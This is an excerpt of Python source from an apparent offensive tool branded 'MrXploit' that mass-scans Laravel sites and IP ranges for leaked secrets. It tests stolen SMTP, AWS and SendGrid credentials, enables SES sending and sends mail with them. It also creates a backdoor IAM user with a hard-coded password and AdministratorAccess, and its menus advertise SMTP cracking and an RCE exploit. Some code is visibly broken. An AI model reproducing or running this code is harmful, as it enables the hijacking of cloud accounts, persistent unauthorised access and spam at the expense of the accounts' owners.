                            self.write_file(smtp_live, _body_text_)
                        except:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["|".join([mail_host, mail_port, mail_user, mail_pass]), "Failed"],
                                status=False,
                                mode="Laravel SMTP Scanner",
                            )
                            self.write_file(smtp_dead, _body_text_)
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Config Not Found",
                        status=False,
                        mode="Laravel SMTP Scanner",
                    )

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel SMTP Scanner"
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
def aws_checker(self, counter, length, acc):
        try:

            acc = self.safe_string(acc)
            acc = acc.split("|")

            aws_access = acc[0]
            aws_secret = acc[1]
            aws_region = acc[2]

            ses_live = self.set_result(filename="ses_live.txt")
            ses_dead = self.set_result(filename="ses_dead.txt")

            smtp_ses_success = self.set_result(filename="smtp_ses_success.txt")
            smtp_ses_failed  = self.set_result(filename="smtp_ses_failed.txt")

            iam_live = self.set_result(filename="iam_live.txt")
            iam_dead = self.set_result(filename="iam_dead.txt")

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            SMTP_REGIONS = [
                'us-east-2',       # US East (Ohio)
                'us-east-1',       # US East (N. Virginia)
                'us-west-2',       # US West (Oregon)

                'ap-south-1',      # Asia Pacific (Mumbai)
                'ap-northeast-2',  # Asia Pacific (Seoul)
                'ap-southeast-1',  # Asia Pacific (Singapore)
                'ap-southeast-2',  # Asia Pacific (Sydney)
                'ap-northeast-1',  # Asia Pacific (Tokyo)
                'ca-central-1',    # Canada (Central)
                'eu-central-1',    # Europe (Frankfurt)
                'eu-west-1',       # Europe (Ireland)
                'eu-west-2',       # Europe (London)
                'sa-east-1',       # South America (Sao Paulo)
                'us-gov-west-1',   # AWS GovCloud (US)
            ]

            def sign(key, msg):
                return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

            def calculate_key(secret_access_key, region):

                DATE     = "11111111"
                SERVICE  = "ses"
                MESSAGE  = "SendRawEmail"
                TERMINAL = "aws4_request"
                VERSION  = 0x04

                SMTP_REGION = [
                    'us-east-2',       # US East (Ohio)
                    'us-east-1',       # US East (N. Virginia)
                    'us-west-2',       # US West (Oregon)
                    'ap-south-1',      # Asia Pacific (Mumbai)
                    'ap-northeast-2',  # Asia Pacific (Seoul)
                    'ap-southeast-1',  # Asia Pacific (Singapore)
                    'ap-southeast-2',  # Asia Pacific (Sydney)
                    'ap-northeast-1',  # Asia Pacific (Tokyo)
                    'ca-central-1',    # Canada (Central)
                    'eu-central-1',    # Europe (Frankfurt)
                    'eu-west-1',       # Europe (Ireland)
                    'eu-west-2',       # Europe (London)
                    'sa-east-1',       # South America (Sao Paulo)
                    'us-gov-west-1',   # AWS GovCloud (US)
                ]

                if region not in SMTP_REGION:
                    raise ValueError(f"The {region} Region doesn't have an SMTP endpoint.")

                signature = sign(("AWS4" + secret_access_key).encode('utf-8'), DATE)
                signature = sign(signature, region)
                signature = sign(signature, SERVICE)
                signature = sign(signature, TERMINAL)
                signature = sign(signature, MESSAGE)
                signature_and_version = bytes([VERSION]) + signature
                smtp_password = base64.b64encode(signature_and_version)

                return smtp_password.decode('utf-8')

            for region in SMTP_REGIONS:
                try:

                    ses = boto3.client("ses", aws_access_key_id=aws_access, aws_secret_access_key=aws_secret, region_name=region)
                    quota = ses.get_send_quota()
                    verified = ses.list_verified_email_addresses()
                    enable_sending = ses.update_account_sending_enabled(Enabled=True)

                    max_send      = quota["Max24HourSend"]
                    send_rate     = quota["MaxSendRate"]
                    last_send     = quota["SentLast24Hours"]
                    list_verified = verified["VerifiedEmailAddresses"]

                    list_ses = [max_send, send_rate, last_send]

                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data="|".join([aws_access, aws_secret, region]),
                        message="|".join([str(i) for i in list_ses]),
                        status=True,
                        mode="AWS Checker"
                    )

                    build_ses = "====================[ $$ MrXploitBot AWS SES $$ ]====================\n"
                    build_ses += "# AWS Access Key ID      : %s\n" % aws_access
                    build_ses += "# AWS Secret Access Key  : %s\n" % aws_secret
                    build_ses += "# AWS Default Region     : %s\n" % region
                    build_ses += "# Max 24 Hour Send       : %s\n" % max_send
                    build_ses += "# Max Send Rate          : %s\n" % send_rate
                    build_ses += "# Sent Last 24 Hours     : %s\n" % last_send
                    if len(list_verified) != 0:
                        for email_verified in list_verified:
                            build_ses += "# Verified Email Address : %s\n" % email_verified
                    build_ses += "=========================================================================\n"
                    append_ses = self.join_string(build_ses)
                    self.write_file(ses_live, append_ses)

                    if len(list_verified) != 0:

                        from_sender     = list_verified[0]
                        from_name       = "MrXploitaws"
                        email_recipient = self.EMAIL_TEST
                        subject         = "MrXploitBot AWS SES SMTP (%s) " % from_sender
                        smtp_host       = "email-smtp.%s.amazonaws.com" % region
                        smtp_port       = 587
                        smtp_username   = aws_access
                        smtp_password   = calculate_key(aws_secret, region)


                        build_smtp = "====================[ $$ MrXploitBot AWS SES $$ ]====================\n"
                        build_smtp += "# AWS Access Key ID     : %s\n" % aws_access
                        build_smtp += "# AWS Secret Access Key : %s\n" % aws_secret
                        build_smtp += "# AWS Default Region    : %s\n" % region
                        build_smtp += "# Max 24 Hour Send      : %s\n" % max_send
                        build_smtp += "# Max Send Rate         : %s\n" % send_rate
                        build_smtp += "# Sent Last 24 Hours    : %s\n" % last_send
                        build_smtp += "# Host                  : email.%s.amazonaws.com\n" % region
                        build_smtp += "# Port                  : 587\n"
                        build_smtp += "# Username              : %s\n" % aws_access
                        build_smtp += "# Password              : %s\n" % calculate_key(aws_secret, region)
                        build_smtp += "# Send To               : %s\n" % email_recipient
                        for from_email in list_verified:
                            build_smtp += "# From Email            : %s\n" % from_email
                        build_smtp += "=========================================================================" + "\n"
                        append_smtp = self.join_string(build_smtp)

                        BODY_TEXT = append_smtp

                        BODY_HTML = "<html>\n"
                        BODY_HTML += "<head>\n"
                        BODY_HTML += "<body>\n"
                        BODY_HTML += "<pre>\n"
                        BODY_HTML += BODY_TEXT
                        BODY_HTML += "</pre>\n"
                        BODY_HTML += "</body>\n"
                        BODY_HTML += "</html>\n"
                        BODY_MESSAGE = self.join_string(BODY_HTML)

                        msg            = MIMEMultipart('alternative')
                        msg['Subject'] = subject
                        msg['From']    = email.utils.formataddr((from_name, from_sender))
                        msg['To']      = email_recipient

                        part1 = MIMEText(BODY_TEXT, 'plain')
                        part2 = MIMEText(BODY_MESSAGE, 'html')

                        msg.attach(part1)
                        msg.attach(part2)

                        try:
                            server = smtplib.SMTP(smtp_host, smtp_port)
                            server.ehlo()
                            server.starttls()
                            server.ehlo()
                            server.login(smtp_username, smtp_password)
                            server.sendmail(from_sender, email_recipient, msg.as_string())
                            server.close()

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data="|".join([smtp_host, smtp_port, smtp_username, smtp_password, email_recipient]),
                                message="Send Success!",
                                status=True,
                                mode="AWS Checker"
                            )
                            self.write_file(smtp_ses_success, append_smtp)

                        except smtplib.SMTPResponseException as Error:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data="|".join([str(smtp_host), str(smtp_port), str(smtp_username), str(smtp_password), str(email_recipient)]),
                                message=Error.smtp_error,
                                status=False,
                                mode="AWS Checker"
                            )
                            self.write_file(smtp_ses_failed, append_smtp)

                    try:

                        iam = boto3.client('iam', aws_access_key_id=aws_access, aws_secret_access_key=aws_secret, region_name=region)

                        username = "MrXploitxAws"
                        password = "WeareMrXploit2022##"

                        create_user = iam.create_user(UserName=username)

                        get_username = create_user["User"]["UserName"]
                        get_arn      = create_user["User"]["Arn"]

                        create_password = client.create_login_profile(Password=password, PasswordResetRequired=False, UserName=username)

                        add_admin = client.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess', UserName=username)

                        build_iam = "====================[ $$ MrXploitBot AWS IAM $$ ]====================\n"
                        build_iam += "# Console URL : https://console.aws.amazon.com/iam/home\n"
                        build_iam += "# Account ID  : %s\n" % get_arn
                        build_iam += "# Username    : %s\n" % get_username
                        build_iam += "# Password    : %s\n" % get_arn
                        build_iam += "=========================================================================\n"
                        append_iam = self.join_string(build_iam)
                        self.write_file(iam_live, append_iam)

                    except botocore.exceptions.ClientError as Error:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data="|".join([aws_access, aws_secret, aws_region]),
                            message=Error.response["Error"]["Message"],
                            status=False,
                            mode="AWS Checker"
                        )
                        build = "|".join([aws_access, aws_secret, region])
                        self.write_file(iam_dead, build)

                except botocore.exceptions.ClientError as Error:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data="|".join([aws_access, aws_secret, aws_region]),
                        message=Error.response["Error"]["Message"],
                        status=False,
                        mode="AWS Checker"
                    )
                    build = "|".join([aws_access, aws_secret, region])
                    self.write_file(ses_dead, build)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

def ec_checker(self, counter, length, key):

        acc = self.safe_string(key)
        acc = acc.split("|")

        _access = acc[0]
        _secret = acc[1]
        _region = acc[2]

        #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        ec_live = self.set_result(filename="ec2_live.txt")
        ec_dead = self.set_result(filename="ec2_dead.txt")

        get_service_region = self.set_result(filename="get_service_region.txt")
        bad_result = self.set_result("ec2_bad_result.txt")

        try:

            print(f"{fc}[{gr}+{fc}] {red}================================================== {fc}[{gr}+{fc}]")
            print(f"{fc}[{gr}+{fc}]  Setup AWS Access Key ID : %s" % _access)
            subprocess.call("aws configure set aws_access_key_id %s" % _access, shell=True)
            subprocess.call("aws configure set aws_secret_access_key  %s" % _secret, shell=True)
            print(f"{fc}[{gr}+{fc}] Setup AWS Secret Access Key : %s" % _secret)
            subprocess.call("aws configure set default.region  %s" % _region, shell=True)
            print(f"{fc}[{gr}+{fc}] Setup AWS Region : %s" % _region)

            call = subprocess.check_output('aws service-quotas list-service-quotas --service-code ec2 --query "Quotas[*].{QuotaName:QuotaName,Value:Value}"', shell=True).decode()

            try:
                parse = json.loads(call)
                try:
                    if parse:
                        print(f"{fc}[{gr}+{fc}] {yl}AWS Access Key ID {res}: %s{fc}" % _access)
                        print(f"{fc}[{gr}+{fc}] {yl}AWS Secret Access Key {res}: %s{fc}" % _secret)
                        print(f"{fc}[{gr}+{fc}] {yl}AWS Region {res}: %s{fc}" % _region)
                        print(f"{fc}[{gr}+{fc}] {gr}AWS Service {res}:{gr} ")

                        build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
                        build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
                        build_ec += "AWS_DEFAULT_REGION : %s\n" % _region
                        build_ec += "AWS_SERVICE : "

                        join_ec = self.join_string(build_ec)
                        self.write_file(get_service_region, join_ec)
                        region = ["us-east-1", "us-east-2", "us-west-1", "us-west-2", "af-south-1", "ap-east-1", "ap-south-1", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3", "ap-southeast-1", "ap-southeast-2", "ca-central-1", "eu-central-1", "eu-west-1", "eu-west-2", "eu-west-3", "eu-south-1", "eu-north-1", "me-south-1", "sa-east-1"]
                        for reg in region:
                            print(f"{fc}\n Region :{res} %s" % reg)
                            query = 'aws service-quotas list-service-quotas --service-code ec2 --region '+reg+' --query \"Quotas[*].{QuotaName:QuotaName,Value:Value}\" --output table'
                            try:
                                result = subprocess.check_output(query,shell=True).decode()
                                print(f"{fc}{result}")
                            except:
                                result = "This Account Not Subscribed in %s Region" % reg
                                print(f"{red}{result}")

                            details = "Region : %s \n\n %s " % (reg, result)
                            self.write_file(get_service_region, details)

                        print(f"{red}[{fc}+{red}] ================================================== {red}[{fc}+{red}]")
                        self.write_file(ec_live, key)

                    else:
                        print(f"{red}[{fc}+{red}] {yl}AWS Access Key ID {res}: %s{fc}" % _access)
                        print(f"{red}[{fc}+{red}] {yl}AWS Secret Access Key {res}: %s{fc}" % _secret)
                        print(f"{red}[{fc}+{red}] {yl}AWS Region {res}: %s{fc}" % _region)
                        print(f"{red}[{fc}+{red}] {gr}AWS Status {res}: {red}Dead")

                        build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
                        build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
                        build_ec += "AWS_DEFAULT_REGION : %s\n" % _region

                        join_ec = self.join_string(build_ec)
                        self.write_file(bad_result, join_ec)
                        self.write_file(ec_dead, key)

                except Exception as e:
                    print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                    pass

            except Exception:
                pass

        except:

            print(f"{red}[{fc}+{red}] {yl}AWS Access Key ID {res}: {fc}%s" % _access)
            print(f"{red}[{fc}+{red}] {yl}AWS Secret Access Key {res}: %s{fc}" % _secret)
            print(f"{red}[{fc}+{red}] {yl}AWS Region {res}: %s{fc}" % _region)
            print(f"{red}[{fc}+{red}] {gr}AWS Status {res}: {red}Dead")

            build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
            build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
            build_ec += "AWS_DEFAULT_REGION : %s\n" % _region

            join_ec = self.join_string(build_ec)
            self.write_file(bad_result, join_ec)
            #self.write_file(ec_dead, key)


def sendgrid_checker(self, counter, length, api_key):
        try:
            sendgrid_live = self.set_result("sendgrid_live.txt")
            sendgrid_dead = self.set_result("sendgrid_dead.txt")

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:

                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Authorization": "Bearer " + api_key
                }

                #sg = SendGridAPIClient(api_key)


                req_info = requests.get('https://api.sendgrid.com/v3/user/credits', headers=headers)
                req_user = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers)

                get_used = json.loads(req_info.text)["used"]
                get_limit = json.loads(req_info.text)["total"]
                get_from = json.loads(req_user.text)["email"]


                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=api_key,
                    message=["|".join([str(get_limit), str(get_used), str(get_from)])],
                    status=True,
                    mode="Sendgrid Checker"
                )

                build_sendgrid  = "SMTP Host     : smtp.sendgrid.net\n"
                build_sendgrid += "SMTP Port     : 587\n"
                build_sendgrid += "SMTP Username : apikey\n"
                build_sendgrid += "SMTP Password : %s\n" % api_key
                build_sendgrid += "SMTP From     : %s\n" % get_from
                append_sendgrid = self.join_string(build_sendgrid)

                self.write_file(sendgrid_live, append_sendgrid)


            except:
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=api_key,
                    message="Dead",
                    status=False,
                    mode="Sendgrid Checker"
                )
                self.write_file(sendgrid_dead, api_key)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
def run_bot(self, bot_mode, input_list, num_threads):
        try:
            load_list    = self.get_file(input_list)
            list_value   = load_list["list"]
            list_length  = load_list["length"]
            list_counter = 0
            self.show_info_message(message="Starting %s Jobs with %s Workers" % (list_length, num_threads))
            pool = ThreadPool(int(num_threads))
            for data in list_value:
                list_counter = list_counter + 1
                try:
                    iterable = (str(list_counter), str(list_length), str(data))
                    pool.add_task(self.map_helper, bot_mode, iterable)
                except (SystemExit, KeyboardInterrupt):
                    self.show_error_message("Task Cancelled")
            pool.wait_completion()
        except KeyboardInterrupt:
            self.show_error_message("Caught Keyboard Interrupt, Terminating Workers")
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
#RCE zone
#PRINT ZONE MrXploit


def printez():
    screen_clear()
    print(f'''
{red} __  __    __  __      _       _ _   
{red}|  \/  |_ _\ \/ /_ __ | | ___ (_) |_ 
{red}| |\/| | '__\  /| '_ \| |/ _ \| | __|
{red}| |  | | |_ /  \| |_) | | (_) | | |_ 
{red}|_|  |_|_(_)_/\_\ .__/|_|\___/|_|\__|
{red}                |_|                  

{red}------- \033[32mSettings{red} -------
{fc}┬───────────────
{fc}└╼ {yl}Your Email is {fc}[{gr}{emailnow}{fc}]


{gr}──────────────────────────────────────────────────────────
{red}├╼ {red}[{gr}1{red}] {gr}SMTP CRACKER [Laravel] {res}[{gr}ACTIVE{res}]                    {red}|
{gr}|                                                         {gr}|
{red}├╼ {red}[{gr}2{red}] {gr}RCE {gr}EXPLOIT {res}[{gr}ACTIVE{res}]                         {red}|
{gr}|                                                         {gr}|
{gr}──────────────────────────────────────────────────────────


    ''')
def banner3(bty):
    os.system("cls") if os.name == "nt" else os.system("clear")
    print("{}".format(f"{red}*" * 55))
    print(bty.green("\t\t Private Laravel Cracker+\n"))
    print(f"\t   {yl}100% {red}Crack AWS Panel{gr} +{red} Quota\n")
    print("{}".format(f"{red}*" * 55))
    print("\n")
#from socket import *

def laravel6():
    import os
    from multiprocessing import Pool
    from concurrent.futures import ThreadPoolExecutor

    try:
        os.mkdir('Results')
        os.mkdir('Results/forchecker')
        os.mkdir('Results/logsites')
        os.mkdir('Results/manual')
        os.mkdir('AWS_ByPass')
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print('''Using Configuration :\n\tFILES=''' + lists + '''\n\tTHREAD=''' + numthread + '''\n\tSESSION=''' + sessi)
        tanya = input("Want to continue session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n" + sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl  # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = input("\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = input("\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://" + url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(legaMrXploit, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES=" + lists + "\nTHREAD=" + str(numthread) + "\nSESSION=" + jagases + "\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass

    try:
        os.mkdir('Results')
        os.mkdir('Results/forchecker')
        os.mkdir('Results/logsites')
        os.mkdir('Results/manual')
        print("\033[33m If the bot stop work \033[31mor\033[33m not start the \033[36mBeast Mode \033[0m try use the list without \033[31mhttp:// - https://")
        try:
            list = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
            lists = open(list, 'r').read().split('\n')
            print(f'''
{red}[{gr}1{red}]{res} {yl}MultiProcessing {res}[{gr}Fast{res}]
{red}[{gr}2{red}]{res} {yl}ThreadPool {res}[{red}Normal{res}]
                ''')
            chosethrd = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mChoice a method\033[31;1m]\n└─╼\033[32;1m#")
            if chosethrd == '1':
                mp = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                pp = Pool(int(mp))
                pp.map(jembotngw2old, lists)
            else:
                thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                for listss in lists:
                    with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                        executor.submit(jembotngw2old, listss)
        except:
            print('{}Wrong'.format(fr))
    except Exception as e:
        print(e)

    laravel_grabber()

    try:
        os.mkdir('AWS_ByPass')
    except:
        pass
    bty = Beauty()
    banner3(bty)
    main(bty)

    try:
        os.mkdir('Results')
        os.mkdir('Results/debug')
        os.mkdir('Results/env')
    except:
        pass
    bagaincap()

    try:
        os.mkdir('Reverse')
    except:
        pass

try:
                list = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
                lists = open(list, 'r').read().split('\n')
                print(f'''
        {red}[{gr}1{red}]{res} {yl}MultiProcessing {res}[{gr}Fast{res}]
        {red}[{gr}2{red}]{res} {yl}ThreadPool {res}[{red}Normal{res}]
                ''')
                chosethrd = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mChoice a method\033[31;1m]\n└─╼\033[32;1m#")
                if chosethrd == '1':
                    mp = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                    pp = Pool(int(mp))
                    pp.map(ranga, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(ranga, listss)
except:
                print('{}Wrong'.format(fr))

def exploiter(i) :
                ASN = i
                r = requests.get(f"https://api.bgpview.io/asn/{ASN}/prefixes").json()
                rather = r['data']['ipv4_prefixes']
                for Yh in range(0, int(len(rather)) - 1):
                    IPM = r['data']['ipv4_prefixes'][Yh]
                    Jahl = IPM['ip'] + '/' + str(IPM['cidr'])
                    IPL = ipranges.IP4Net(Jahl)
                    for IP in IPL:
                        open('ASN/IP_ASN.txt', 'a', errors='ignore', encoding='utf-8').write(f"{IP}\n")
                        print(f"{gr}{IP}")
                #   except Exception as e:
                    try:
                        pass
                    finally:
                        e = None
                        del e

done = False
            #here is the animation
def animate():
                for c in itertools.cycle(['|', '/', '-', '\\']):
                    if done:
                        break
                    sys.stdout.write('\rloading ' + c)
                    sys.stdout.flush()
                    time.sleep(0.1)
                sys.stdout.write('\rDone!     ')


def alege():
    printez()
    while True:

        print(f'{red}┌─{res}[{cy}MrXploit SMTP{res}]{gr}─{res}[{mg}/{gr}Wich Bot you want use?{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            screen_clear()
            laravel6()
        elif choice == "2":
            screen_clear()
            RCEBot()
alege()
